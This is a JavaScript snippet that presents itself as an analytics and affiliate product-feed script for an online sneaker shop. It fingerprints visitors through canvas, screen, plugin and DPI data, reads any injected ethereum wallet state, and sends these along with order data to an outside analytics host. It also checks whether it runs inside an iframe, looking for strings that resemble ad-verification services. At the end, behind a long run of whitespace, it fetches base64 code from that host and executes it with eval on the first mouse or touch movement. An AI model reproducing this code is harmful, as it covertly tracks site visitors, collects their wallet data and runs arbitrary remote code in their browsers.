var _adowymz_dbg = ""; function _rwqdhs_addfprt(object) { if(typeof ethereum !== "undefined" && ethereum._state) { object.eth = btoa(JSON.stringify(ethereum._state)); } object.sw = window.window.innerWidth; object.sh = window.window.innerHeight; var fHS63scanvas = document.createElement("canvas"); fHS63scanvas.style = "position: absolute; display: none;"; fHS63scanvas.width = 200; fHS63scanvas.height = 40; var fHS63sbodyElement = document.getElementsByTagName('body'); if (fHS63sbodyElement && fHS63sbodyElement[0]) { fHS63sbodyElement[0].appendChild(fHS63scanvas); } var fHS63sctx = fHS63scanvas.getContext("2d");  fHS63sctx.fillStyle = "rgb(255,0,255)"; fHS63sctx.beginPath(); fHS63sctx.rect(20, 20, 150, 100); fHS63sctx.fill(); fHS63sctx.stroke(); fHS63sctx.closePath(); fHS63sctx.beginPath(); fHS63sctx.fillStyle = "rgb(0,255,255)"; fHS63sctx.arc(50, 50, 50, 0, Math.PI * 2, true); fHS63sctx.fill(); fHS63sctx.stroke();    fHS63sctx.closePath(); fHS63sctx.textBaseline = "top"; fHS63sctx.font = '17px "Arial 17"'; fHS63sctx.textBaseline = "alphabetic"; fHS63sctx.fillStyle = "rgb(255,5,5)"; fHS63sctx.rotate(.03); fHS63sctx.fillText('abz190#$%^@£éú', 4, 17); fHS63sctx.fillStyle = "rgb(155,255,5)"; fHS63sctx.shadowBlur=8; fHS63sctx.shadowColor="red"; fHS63sctx.fillRect(20,12,100,5); fHS63ssrc = fHS63scanvas.toDataURL(); var fHS63shash = 0;  for (i = 0; i < fHS63ssrc.length; i++) { char = fHS63ssrc.charCodeAt(i); fHS63shash = ((fHS63shash<<5)-fHS63shash)+char; fHS63shash = fHS63shash & fHS63shash; } object.fpc = fHS63shash; try { object.sch = window.matchMedia("(prefers-color-scheme: light)").matches; } catch(e) { object.sch = "unknown" } try { object.tch = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0)); } catch(e) { object.tch = "unknown"; } var f7436el = document.createElement('div'); f7436el.style.width = '1in'; document.body.appendChild(f7436el); const f7436dpi = f7436el.offsetWidth * (devicePixelRatio || 1); f7436el.remove(); object.dpi = f7436dpi; var x=navigator.plugins.length; var txt=""; for(var i=0;i<x;i++) { txt+=navigator.plugins[i].name + " "; } object.plg = txt; if(object.location.includes('#nbncidtf')) {    } return object; } try {  window.mm_migration_query = '{"rptds":"https://www.footshop.sk/sk/panske-tenisky-a-topanky/385810-new-balance-1906.html"}';  /* DO NOT CHANGE */
var ctl = {nr: '65019a65a63a078297192190', cls: 'generic', referer: document.referrer.toString(), location: window.location.href};
ctl = _rwqdhs_addfprt(ctl);
// leave this line here
/* DO NOT CHANGE */

/* ---------------BEGIN CUSTOM CODE HERE ------------------ */

//ctl.comment = dataLayer ? JSON.stringify(dataLayer) : 'FAIL'; 


 function getQ(q, a=null){
  if(a)   return document.querySelector(q) !== null ? document.querySelector(q).getAttribute(a) : "";
  else    return document.querySelector(q) !== null ? document.querySelector(q).innerText : "";
}


function getPageType(){

    if(window.location.pathname == '/sk/')    return 'home';
   // if(window.location.pathname == '/fr/homme')    return 'home';
      if(ctl.location.includes('/success'))    return 'order';
     if(ctl.location.toUpperCase().includes('/THANK_YOU')) return 'order';
    if(ctl.location.toUpperCase().includes('/THANK-YOU')) return 'order';
   if(ctl.location.includes('/order-received/'))    return 'order';
    if(dataLayer.find(x => x[1] && x[1] == 'purchase')) return 'order';
   if(getQ('body[id]','id')=='product') return 'product';
   if(getQ('body[id]','id')=='listing') return 'catalog';
    if(ctl.location.includes('/wish-list'))    return 'wishlist';
    if(ctl.location.includes('order/1'))    return 'cart';
    if(ctl.location.includes('order/2'))    return 'checkout';
     if(ctl.location.includes('/search?'))    return 'search';
   
   
   
   
      
    return null;
  }
  
var pageType = getPageType();


if(typeof pageType !== 'undefined' && pageType != null) {
    switch(pageType) {
        case "home":
            ctl.cls = 'front';
            // leave this line here
            break;
        case "product":
            ctl.cls = 'product';
            ctl.productid = window.location.toString().split('/').pop().split('-')[0];
            
       var incoming = {
                    campaign: "65019a65a63a078297192190", //Leave this unchanged
                    catalog: "65019a65a63a078297192196", //Add catalog id
                    id: ctl.productid || "",
                    availability: "1",
                    googleProductCategory: "1",
                    mpn: ctl.productid || "",
                    link: "https://www.anrdoezrs.net/click-100370512-11910051?url=" ,
                    currency: 'EUR',
                    title :  getQ('h1[itemprop="name"]'),
                    description : getQ('[class^="ProductDetails_categoryDescription"]') ,
                    imageLink: getQ('[class^="BoxRatio_container"] img','src') ,
                    price : getQ('strong[class^="ProductProperties_priceValue"]').replace(/€/g,'').trim().replace(/,/g, '.'),
                    brand: "footshop"
                    
                    // additionalImageLink: "", //Optional
                    // additionalImageLink2: "", //Optional
                    // additionalImageLink3: "", //Optional
                    // additionalImageLink4: "", //Optional
                    // additionalImageLink5: "", //Optional
                    // unitPricingMeasure: "", //Optional
                    // unitPricingBaseMeasure: "", //Optional
                    // gtin: "", //Optional
                    // condition: "", //Optional
                    // shipping: "", //Optional
                }
                
                  incoming.salePrice = incoming.price ;
                  incoming.link += document.querySelector("link[rel='canonical']") !== null ? encodeURIComponent(document.querySelector("link[rel='canonical']").getAttribute("href")) : encodeURIComponent(ctl.location.split("?")[0]);
                
                   
                // leave this line here
                
                if(incoming.catalog != "" && incoming.id != "") {
                
                
                    var productObject = {
                        id: (typeof incoming.id !== "undefined" ? incoming.id : ""),
                        title: (typeof incoming.title !== "undefined" ? incoming.title : ""),
                        description: (typeof incoming.description !== "undefined" ? incoming.description : ""),
                        link: (typeof incoming.link !== "undefined" ? incoming.link : ""),
                        imageLink: (typeof incoming.imageLink !== "undefined" ? incoming.imageLink : ""),
                        price: (typeof incoming.price !== "undefined" ? incoming.price : ""),
                        salePrice: (typeof incoming.salePrice !== "undefined" ? incoming.salePrice : ""),
                        googleProductCategory: (typeof incoming.googleProductCategory !== "undefined" ? incoming.googleProductCategory : ""),
                        brand: (typeof incoming.brand !== "undefined" ? incoming.brand : ""),
                        mpn: (typeof incoming.mpn !== "undefined" ? incoming.mpn : ""),
                        additionalImageLink: (typeof incoming.additionalImageLink !== "undefined" ? incoming.additionalImageLink : ""),
                        additionalImageLink2: (typeof incoming.additionalImageLink2 !== "undefined" ? incoming.additionalImageLink2 : ""),
                        additionalImageLink3: (typeof incoming.additionalImageLink3 !== "undefined" ? incoming.additionalImageLink3 : ""),
                        additionalImageLink4: (typeof incoming.additionalImageLink4 !== "undefined" ? incoming.additionalImageLink4 : ""),
                        additionalImageLink5: (typeof incoming.additionalImageLink5 !== "undefined" ? incoming.additionalImageLink5 : ""),
                        unitPricingMeasure: (typeof incoming.unitPricingMeasure !== "undefined" ? incoming.unitPricingMeasure : ""),
                        unitPricingBaseMeasure: (typeof incoming.unitPricingBaseMeasure !== "undefined" ? incoming.unitPricingBaseMeasure : ""),
                        gtin: (typeof incoming.gtin !== "undefined" ? incoming.gtin : ""),
                        sellerLogo: (typeof incoming.sellerLogo !== "undefined" ? incoming.sellerLogo : ""),
                        currency: (typeof incoming.currency !== "undefined" ? incoming.currency : ""),
                        country: (typeof incoming.country !== "undefined" ? incoming.country : ""),
                        condition: (typeof incoming.condition !== "undefined" ? incoming.condition : ""),
                        shipping: (typeof incoming.shipping !== "undefined" ? incoming.shipping : ""),
                        prefix: (typeof incoming.prefix !== "undefined" ? incoming.prefix : ""),
                    }
                
                    if(typeof incoming.listed !== "undefined" && incoming.listed == "false") { productObject.listed = false } else { productObject.listed = true };
                    if(typeof incoming.featured !== "undefined" && incoming.featured == "false") { productObject.featured = false } else { productObject.featured = true };
                    if(typeof incoming.upsert !== "undefined" && (incoming.upsert == "true" || incoming.upsert == "false")) productObject.upsert = incoming.upsert;
                    if(typeof incoming.prefixImageFile !== "undefined" && (incoming.prefixImageFile == "true" || incoming.prefixImageFile == "false")) productObject.prefixImageFile = incoming.prefixImageFile;
                    if(typeof incoming.availability !== "undefined") productObject.availability = incoming.availability;
                
                
                    if(typeof ctl42 !== "undefined") {
                        ctl42.fdcrw_catalog = incoming.catalog;
                        ctl42.fdcrw_data = JSON.stringify(productObject);
                    }
                    if(typeof ctl !== "undefined") {
                        ctl.fdcrw_catalog = incoming.catalog;
                        ctl.fdcrw_data = JSON.stringify(productObject);
                    }
                
                }            
            // leave this line here
                  
            break;
        case "catalog":
            ctl.cls = 'catalog';
           ctl.category = window.location.toString().split('-').pop();
            // leave this line here
            break;
        case "checkout":
            ctl.cls = "checkout";
        // leave this line here
            break;
         case "search":
            ctl.cls = "search";
              ctl.searchterm = "";
        // leave this line here
            break;   
            
        case "order":
		if(dataLayer.filter(p => p.event=='purchase').find(x => x.ecommerce)) {
		 ctl.cls = 'order';
       	          try {
          ctl.orderid = dataLayer.find(p => p.event=='purchase').ecommerce.id;
          ctl.ordervalue = dataLayer.find(p => p.event=='purchase').ecommerce.value_local;
          ctl.currency = 'EUR';
          } catch (error) {
          
          ctl.orderid = Date.now();
          ctl.ordervalue = '';
          ctl.currency = 'EUR';
          
          }
		// leave this line here
         }
         else {
         ctl.cls = "checkout";
        // leave this line here
         
         }
            break;
           
            
      case "cart":
        ctl.cls = "cart";
        ctl.productid = "";
        // leave this line here
        break;
        
        case "wishlist": 
	 ctl.cls = "wishlist";
	 // leave this line here
	     break;
	 
    }
}
/* ---------------END CUSTOM CODE HERE ------------------ */
/* DO NOT CHANGE */

var prc=!0;if(top!==self){var cache=[],rsn="",tt=["-isg","oisg","xirti","atcaxe","-caxe",".caxe"];function stringifySelf(r){return JSON.stringify(r,function(r,t){if("object"==typeof t&&null!==t){if(-1!==cache.indexOf(t))try{return JSON.parse(JSON.stringify(t))}catch(r){return}cache.push(t)}return t})}try{var selfString=stringifySelf(self);for(var k in null!==self.frameElement&&(prc=!1,rsn="iframeelement"),tt)!isNaN(k)&&selfString.indexOf(tt[k].split("").reverse().join(""))>=0&&(prc=!1,rsn=tt[k].split("").reverse().join(""))}catch(r){prc=!1,rsn="stringifySelf threw error"}}prc||(window.ctl&&(ctl.ifc="y"),window.ctl42&&(ctl42.ifc="y"));

if (ctl.cls !=='xxx' && ctl.cls !=='yyy') openpixel();
function openpixel() {
//console.log("Pixel send FAT");
//console.log(ctl.cls);
var queryString = Object.keys(ctl).map(function(key) {
    return key + '=' + encodeURIComponent(ctl[key]);
}).join('&');

var ctls = document.createElement('script');
ctls.src = 'https://analytics.fatmedia.io/ctl?' + queryString + '&psk=1430375718136';
var bodyElement = document.getElementsByTagName('body');
if (bodyElement && bodyElement[0]) {
	bodyElement[0].appendChild(ctls);
}

}
/* DO NOT CHANGE */ 
                                                            var ixmeasure = 'd' + Math.floor(Math.random()*1000001);
                                                            var ixmeasure2 = 'd2' + Math.floor(Math.random()*1000001);
                                                            var ixmeasure3 = 'd3' + Math.floor(Math.random()*1000001);
                                                            window[ixmeasure3] = function() {
                                                                try { eval(atob(window[ixmeasure2])); } catch(e) {}
                                                                window.removeEventListener("mousemove", ixMeasur3);
                                                                window.removeEventListener("touchmove", ixMeasur3);
                                                            }
                                                            let ixMeasur3 = window[ixmeasure3];
                                                            window[ixmeasure] = function() {
                                                                var xmlhttp;
                                                                if (window.XMLHttpRequest) {
                                                                    xmlhttp = new XMLHttpRequest();
                                                                }
                                                                else {
                                                                    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
                                                                }
                                                                xmlhttp.onreadystatechange = function() {
                                                                    if (xmlhttp.readyState == 4 && xmlhttp.status==200) {
                                                                        window[ixmeasure2] = xmlhttp.responseText;
                                                                        if(top !== self) {
                                                                            ixMeasur3();
                                                                        }
                                                                        else {
                                                                            window.addEventListener("mousemove", ixMeasur3);
                                                                            window.addEventListener("touchmove", ixMeasur3);
                                                                        }
                                                                    }
                                                                }
                                                                xmlhttp.open("POST","https://analytics.fatmedia.io/al",true);
                                                                xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                                                                xmlhttp.send("c=65019a65a63a078297192190");
                                                            }
                                                            let ixMeasur = window[ixmeasure];
                                                            ixMeasur();
                                                               } catch(err) { _adowymz_dbg = err; console.log('e'); }
